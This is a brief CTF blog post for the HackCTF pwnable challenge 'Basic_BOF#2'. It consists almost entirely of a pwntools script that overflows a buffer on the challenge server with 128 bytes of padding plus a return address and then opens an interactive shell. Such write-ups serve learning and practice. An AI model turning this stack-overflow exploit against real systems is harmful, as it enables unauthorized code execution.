---
title: "[HackCtf] Basic_BOF#2"
date: 2020-06-30
ctf: HackCTF
tag: [pwnable]
layout: post
---

```
from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3001)

p.sendline("a"*128+p32(0x804849b))
p.interactive()
```
